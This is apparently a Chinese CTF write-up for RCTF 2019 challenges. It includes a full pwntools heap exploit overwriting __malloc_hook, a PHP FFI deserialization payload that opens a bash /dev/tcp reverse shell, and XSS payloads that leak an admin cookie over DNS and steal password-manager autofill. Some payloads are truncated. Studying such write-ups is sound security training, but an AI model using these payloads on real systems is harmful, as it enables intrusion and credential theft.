        # for i in range(len(child_dir)):
            # fp.write(child_dir[i]+'\n')
        # fp.close()
        print(child_dir)
        fdir=[]
        fdir+=child_dir
        child_dir=[]
### many_note
#### 漏洞点
> 输入content的时候有个堆溢出
#### 利用过程
many_note有两种做法, 这篇wp里使用的是第一种  
1.改tcachebin  
2.house of Orange  
第一种:  
当不断malloc的时候, topchun大小小于请求大小时, 会把top_chunk free掉, 并且把arena里面top指针改到前面去,
会在tcache_bin(用来管理tcache的一个chunk, 大小为0x250.)前面  
然后把topchunk大小改大, 然后不断malloc, 会malloc到tcachebin区域, 这时malloc出来,
写一个malloc_hook的地址到tcache_bin里, 然后tcache_dup, 写onegadget到malloc_hook即可
#### exp
    #!/usr/bin/env python
    #coding:utf-8
    from pwn import *
    import os,sys,time
    libpath="./libc.so.6"
    libcpath='/lib/x86_64-linux-gnu/libc.so.6'
    libc=ELF(libpath)
    p=process(['./many_notes'])
    p=process(['./ld-linux-x86-64.so.2','--library-path','/mnt/hgfs/F/workflow/rctf2019/pwn-manynotes','./many_notes'])
    if len(sys.argv)==3:
        p=remote("139.180.144.86",20003)
    ru = lambda x : p.recvuntil(x)
    rud = lambda x : p.recvuntil(x,drop=True)
    rl = lambda   : p.recvline()
    rv = lambda x : p.recv(x)
    sn = lambda x : p.send(x)
    sl = lambda x : p.sendline(x)
    sa = lambda a,b : p.sendafter(a,b)
    sla = lambda a,b : p.sendlineafter(a,b)
    def menu(op):
        sla('Choice:',str(op))
    def add(size,padding,data=[]):
        menu(0)
        sla('Size:',str(size))
        sla('Padding:',str(padding))
        if(len(data)==0):
            sla('(0/1):',str(0))
        else:
            sla('(0/1):',str(1))
            ru('Content:')
            for i in data:
                sn(i)
                time.sleep(0.1)
    if len(sys.argv)==2:
        gdb.attach(p)
    sa('name:','a'*0x8)
    time.sleep(0.1)
    ru('to Many Notes, ')
    rv(0x8)
    leak=u64(rv(6).ljust(8,'\x00'))
    io_stdout=leak
    libc.address=libcbase=io_stdout-libc.symbols['_IO_2_1_stdout_']
    __malloc_hook_addr=libc.symbols['__malloc_hook']
    print '[leak]',hex(leak)
    print '[libcbase]',hex(libcbase)
    print '[__malloc_hook_addr]',hex(__malloc_hook_addr)
    for i in range(0x7):
        add(0x2000,1024)
    add(0x2000,0x3e8)
    add(0x5d0,0)
    for i in range(0xf):
        add(0x2000,1024)
    add(0x2000,0x3d0-1)
    payload1='a'*0x10
    payload2='a'*0x10+p64(0x0)+p64(0x30b1)
    add(0x20,0,[payload1,payload2])
    add(0x1000-0x6a0,0)
    payload=p64(0x1010101010101)*2
    payload+=p64(__malloc_hook_addr-0x23)*10
    payload=payload.ljust(0x240,'\x00')
    add(0x240,0,[payload])
    onegadget = 0x40e86+ libcbase
    onegadget = 0x40eda+ libcbase
    onegadget = 0xdea81+ libcbase
    payload='a'*3
    payload+=p64(onegadget)*5
    payload=payload.ljust(0x68,'\x00')
    add(0x68,0,[payload])
    menu(0)
    sla('Size:','104')
    raw_input('interactive ....\n')
    p.interactive()
## web
### nextphp
这题考`PHP7.4`的特性，非常紧跟潮流。直接给了个eval
看一下`phpinfo`,一堆`disable_functions`
很明显绕不过去，再看`open_basedir`
还注意到有一个`opcache.preload`
`preload.php`:
     null,
            'func' => 'print_r',
            'arg' => '1'
        ];
        private function run () {
            $this->data['ret'] = $this->data['func']($this->data['arg']);
        }
        public function __serialize(): array {
            return $this->data;
        }
        public function __unserialize(array $data) {
            array_merge($this->data, $data);
            $this->run();
        }
        public function serialize (): string {
            return serialize($this->data);
        }
        public function unserialize($payload) {
            $this->data = unserialize($payload);
            $this->run();
        }
        public function __get ($key) {
            return $this->data[$key];
        }
        public function __set ($key, $value) {
            throw new \Exception('No implemented');
        }
        public function __construct () {
            throw new \Exception('No implemented');
        }
    }
代码很工整，实现了一个自定义的序列化，反序列化的时候会调用`unserialize`函数，这里的`unserialize`函数功能是改变`$data`数组元素的值，然后实现可变函数的效果。然后主要到这篇[文章](https://stitcher.io/blog/new-in-php-74)去查看`php7.4`的特性，关于`opcache.preload`，可以看[RFC](https://wiki.php.net/rfc/preload)
很好理解，就是选定一个文件来preload。  
还用到了`Foreign Function
Interface`这个点.到[RFC](https://wiki.php.net/rfc/ffi)看`cdef`:
用法：
然后，我们需要利用`preload.php`的可变函数来尝试导入c函数并执行，为什么要利用预加载的`preload.php`，不能直接搞呢，因为这个
    http://nextphp.2019.rctf.rois.io/?a=var_dump(unserialize(%27C:1:%22A%22:97:{a:3:{s:3:%22ret%22;N;s:4:%22func%22;s:9:%22FFI::cdef%22;s:3:%22arg%22;s:34:%22const%20char%20*%20getenv(const%20char%20*);%22;}}%27)-%3Eret-%3Egetenv(%27PATH%27));
导入`getenv`
同理导入`system`,反弹shell即可
    nextphp.2019.rctf.rois.io/?a=var_dump(unserialize('C:1:"A":95:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";}}')->__serialize()[ret]->system("bash -c '/bin/bash -i >%26 /dev/tcp/{{ip}}/{{[port}} 0>%261'"));
### jail
xss题，可以向一个页面写内容，然后把页面的id提交给admin，让它去访问。
avatar的地方可以上传文件，试了一下，没啥好利用的点。  
cookie中有两个hint
目的就是要打到admin的cookie。
    Content-Security-Policy: sandbox allow-scripts allow-same-origin; base-uri 'none';default-src 'self';script-src 'unsafe-inline' 'self';connect-src 'none';object-src 'none';frame-src 'none';font-src data: 'self';style-src 'unsafe-inline' 'self';
在`firefox`下用这个payload就能x到：``  
但是chrome不行
提交了一下，没有打到，bot应该是chrome。我们知道跳转可以无视一切csp，但是这里跳转不了，因为页面上有一段预置的js
把`document.location`给freeze了，而freeze是不能解掉的
后面尝试了用a标签和另外的一些方法，本地是可以跳转的，但是bot不跳呀，因此另寻骚操作。  
之前没见过freeze location这个操作，因此研究了一下location
尝试修改了几个属性，href固然是改不了，但是发现host和hostname属性都是可以改的，而且可以达到一个跳转的效果。这里可以用子域名带出信息，查看DNS
query记录即可，payload:
    function stringToHex(str){
        var val="";
        for(var i = 0; i 
### password
这题用的是jail的同一个环境，题目和hint给的信息都非常关键
提取出几个要点：
> 1.要x的是密码  
>  2.并不是chrome自带的保存密码功能  
>  3.try to read body.innerHTML
这里可以大致猜出一些东西了，要x密码，而且不是chrome自带的密码管理，结合hint，想到会不会是给他插入一段html，然后会给我自动填充密码，我再把密码整出来？于是尝试加一段html到payload里，由于是要x密码，所以自然想到整个表单上去，login那里就有一个现成的表单
一开始是想，延时一段时间(给点时间给密码管理器自动填写)，然后把password的value搞出来，但是啥都打不到。于是还是跟着hint走吧，读一下innerHTML，这一步的payload：
    Login
    function stringToHex(str){
        var val="";
        for(var i = 0; i 
一点点拿到完整的页面内容，发现果然有something interesting
加了个`data-cip-id`的属性，但是我的payload并没有这东西。查了一下，这里用的应该是`ChromeIPass`+`Keepass`这一套，本地装一下，直接拿登录页面来做一下实验。首先点击一下username的框，然后就会有候选密码(前提是已经有存密码)
再右键选中看属性，发现这几个选项都是`cip-ui-menu-item`这个class的，因此可以用`document.getElementsByClassName('cip-ui-menu-item')[?]`来定位他们。这里必须要点一下username的框，才会有这几个选项出现，选项出现之后，选一个来点，password的框就会被自动填充。所以我们的payload就已经出来了：
    Login